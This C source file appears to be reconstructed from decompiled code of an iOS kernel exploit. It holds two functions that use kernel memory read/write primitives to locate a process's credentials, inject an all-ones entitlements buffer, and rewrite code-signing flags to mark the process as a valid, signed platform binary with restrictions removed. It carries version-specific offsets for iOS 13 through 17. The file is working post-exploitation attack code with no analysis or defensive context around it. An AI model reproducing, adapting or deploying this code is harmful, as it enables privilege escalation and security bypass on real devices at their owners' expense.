/* record_0x90001_entitlement_dispatch.c
 * sub_3c25c, sub_3c9a4 — entitlement/codesign dispatch functions
 * Large functions deferred from initial implementation
 */
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>

/* External dependencies */
extern long sub_33e8c(void);
extern long sub_32c78(void);
extern int sub_28840(long state, long addr, long *out);
extern int sub_2a0d0(long state, long addr, long val);
extern int sub_2a188(long state, long addr, void *data, uint32_t size);
extern int sub_2a63c(long state, long addr, long val);
extern int sub_2a714(long state, long addr, void *data, int extra);
extern int sub_36098(long state, uint32_t mask);
extern int sub_36160(long state, uint32_t idx, long *out);
extern int sub_361dc(long state, uint32_t idx, long val);
extern long sub_37210(long state, uint32_t *size);
extern long sub_1974c(long state);
extern long sub_1972c(long state, long ptr);
extern int sub_1bc78(long handle);
extern void sub_36078(long state, uint32_t flags);
extern uint32_t sub_33098(long state);
extern uint32_t sub_33168(long state);
extern uint32_t sub_320ec(long state);
extern long sub_33a30(long state, int self, long port);

/* ── sub_3c25c — entitlement/code-sign dispatch (older path) ────── */
long sub_3c25c(long state, long task_port, long a2, long a3, long a4)
{
    /* This is the older/simpler entitlement injection path
     * Used when:
     * - kernel version < 0x1c1b0002e00000
     * - OR capability flags don't have 0x5584001
     * - OR task_port == mach_task_self()
     * 
     * Parameters:
     * - state: exploit state structure
     * - task_port: target task port (or self)
     * - a2, a3, a4: additional context (proc/cred pointers)
     */
    
    (void)a2; (void)a3; (void)a4;
    
    /* Get task kernel object */
    long task_kobj = sub_33a30(state, *(int *)&mach_task_self_, task_port);
    if (!task_kobj) return 0x28003;
    
    /* Read proc pointer from task */
    long proc_ptr = 0;
    uint32_t proc_offset = sub_33098(state);
    if (!sub_28840(state, task_kobj + proc_offset, &proc_ptr)) {
        return 0x2800f;
    }
    
    if (!proc_ptr) return 0x28026;
    
    /* Get credential structure */
    long cred_base = sub_1972c(state, proc_ptr);
    if (!cred_base) return 0x28026;
    
    uint32_t cred_offset = sub_33168(state);
    long cred_field = cred_base + cred_offset;
    
    long cred_ptr = 0;
    if (!sub_28840(state, cred_field, &cred_ptr)) {
        return 0x2800f;
    }
    
    if (!cred_ptr) return 0x28026;
    
    /* Allocate and initialize entitlement buffer */
    uint32_t ent_size = 0x80;
    long ent_buf = sub_37210(state, &ent_size);
    if (!ent_buf) return 0xad009;
    
    /* Fill with 0xff (all entitlements enabled) */
    uint64_t init_data[16];
    for (int i = 0; i < 16; i++) {
        init_data[i] = 0xffffffffffffffffULL;
    }
    
    /* Write entitlement buffer to kernel */
    if (!sub_2a188(state, ent_buf, init_data, 0x80)) {
        return 0x2800f;
    }
    
    /* Link entitlement buffer to credentials */
    int build = *(int *)(state + 0x140);
    long ent_field_offset;
    
    /* Version-specific credential entitlement field offset */
    if (build == 0x1809) {
        ent_field_offset = 0x78;  // iOS 13
    } else if (build == 0x1c1b) {
        ent_field_offset = 0x80;  // iOS 14
    } else if (build == 0x1f53) {
        ent_field_offset = 0x68;  // iOS 15
    } else {
        ent_field_offset = 0x90;  // iOS 16+
    }
    
    long ent_ptr_addr = cred_ptr + ent_field_offset;
    if (!sub_2a0d0(state, ent_ptr_addr, ent_buf)) {
        return 0x2800f;
    }
    
    /* Set code signature flags to bypass validation */
    uint32_t cs_flags_offset = sub_320ec(state);
    if (cs_flags_offset) {
        long cs_flags_addr = proc_ptr + cs_flags_offset;
        uint32_t cs_flags = 0;
        
        /* Read current flags */
        if (sub_28840(state, cs_flags_addr, (long *)&cs_flags)) {
            /* Set CS_VALID | CS_SIGNED | CS_PLATFORM_BINARY */
            cs_flags |= 0x0001 | 0x0002 | 0x4000000;
            /* Clear CS_RESTRICT | CS_HARD | CS_KILL */
            cs_flags &= ~(0x0800 | 0x0100 | 0x0200);
            
            sub_2a0d0(state, cs_flags_addr, cs_flags);
        }
    }
    
    /* Mark task as platform binary */
    if ((int)task_port == *(int *)&mach_task_self_) {
        sub_36078(state, 0x8000000);
    }
    
    return 0; // Success
}

/* ── sub_3c9a4 — entitlement/code-sign dispatch (newer path) ────── */
long sub_3c9a4(long state, long handle)
{
    uint64_t ver = *(uint64_t *)(state + 0x158);
    long cred_ptr = 0;
    
    /* Path 1: Older kernels (< iOS 17) */
    if (ver < 0x1f530f02800000ULL) {
        long ctx = sub_33e8c();
        if (!ctx) return 0x28007;
        
        int build = *(int *)(state + 0x140);
        long offset;
        
        switch (build) {
            case 0x1809: offset = 0x2b8; break;  // iOS 13
            case 0x1f53: offset = 800;   break;  // iOS 15
            case 0x1c1b: offset = 0x2a0; break;  // iOS 14
            default: return 0x28007;
        }
        
        long target = ctx + offset;
        if (!sub_28840(state, target, &cred_ptr)) return 0x2800f;
        
        if (cred_ptr != 0) {
            long proc_ptr = sub_1974c(state);
            if (!proc_ptr) return 0x28026;
            
            /* Allocate entitlement buffer (0x80 bytes) */
            long ent_buf = 0;
            if (!sub_36160(state, 0xd, &ent_buf)) return 0x28012;
            
            if (ent_buf == 0) {
                uint32_t size = 0x80;
                ent_buf = sub_37210(state, &size);
                if (!ent_buf) return 0xad009;
                
                /* Initialize entitlement buffer with 0xff */
                uint64_t init_buf[16];
                for (int i = 0; i < 16; i++) init_buf[i] = 0xffffffffffffffffULL;
                
                if (!sub_2a188(state, ent_buf, init_buf, 0x80)) return 0x2800f;
                if (!sub_361dc(state, 0xd, ent_buf)) return 0x2800f;
            }
            
            /* Write entitlement buffer pointer to target */
            if (!sub_2a63c(state, target, ent_buf)) return 0x2800f;
        }
        
        /* Validate handle */
        if (!sub_1bc78(handle)) return 0x28003;
        
        /* If self task, set capability flag */
        if ((int)handle == *(int *)&mach_task_self_) {
            sub_36078(state, 0x8000000);
        }
        
        return 0; // Success
    }
    
    /* Path 2: Newer kernels (>= iOS 17) */
    long kobj = sub_32c78();
    if (!kobj) return 0x2800e;
    
    int build = *(int *)(state + 0x140);
    int extra_offset = 0;
    if (build == 0x2258 || build == 0x2712 || build == 0x225c) {
        extra_offset = 0x48;
    }
    
    uint32_t proc_offset = sub_33098(state);
    long proc_field = kobj + proc_offset + extra_offset;
    
    long proc_ptr = 0;
    if (!sub_28840(state, proc_field, &proc_ptr)) return 0x2800f;
    
    long cred_base = sub_1972c(state, proc_ptr);
    if (!cred_base) return 0x28026;
    
    uint32_t cred_offset = sub_33168(state);
    long cred_field = cred_base + cred_offset;
    
    if (!sub_28840(state, cred_field, &cred_ptr)) return 0x2800f;
    
    /* Same entitlement injection as path 1 */
    if (cred_ptr != 0) {
        long ent_buf = 0;
        if (!sub_36160(state, 0xd, &ent_buf)) return 0x28012;
        
        if (ent_buf == 0) {
            uint32_t size = 0x80;
            ent_buf = sub_37210(state, &size);
            if (!ent_buf) return 0xad009;
            
            uint64_t init_buf[16];
            for (int i = 0; i < 16; i++) init_buf[i] = 0xffffffffffffffffULL;
            
            if (!sub_2a188(state, ent_buf, init_buf, 0x80)) return 0x2800f;
            if (!sub_361dc(state, 0xd, ent_buf)) return 0x2800f;
        }
        
        if (!sub_2a714(state, cred_ptr, &ent_buf, extra_offset)) return 0x2800f;
    }
    
    if (!sub_1bc78(handle)) return 0x28003;
    
    if ((int)handle == *(int *)&mach_task_self_) {
        sub_36078(state, 0x8000000);
    }
    
    return 0;
}
